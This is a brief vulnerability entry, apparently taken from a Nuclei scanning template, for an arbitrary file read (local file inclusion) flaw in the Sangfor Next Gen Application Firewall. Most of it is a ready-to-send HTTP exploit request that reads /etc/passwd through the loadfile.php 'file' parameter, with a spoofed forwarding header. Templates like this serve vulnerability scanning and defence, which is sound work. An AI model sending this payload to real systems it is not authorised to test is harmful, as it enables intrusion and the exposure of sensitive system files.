# Vulnerability: Sangfor Next Gen Application Firewall - Arbitary File Read
**Classification:** SANGFOR
**Source:** Nuclei Template (`sangfor-ngaf-lfi.yaml`)

## Description
Sangfor Next Gen Application Firewall is susceptible to Local File Inclusion as it does not validate the file parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /svpn_html/loadfile.php?file=/etc/./passwd HTTP/1.1
Host: {{Hostname}}
y-forwarded-for: 127.0.0.1
```

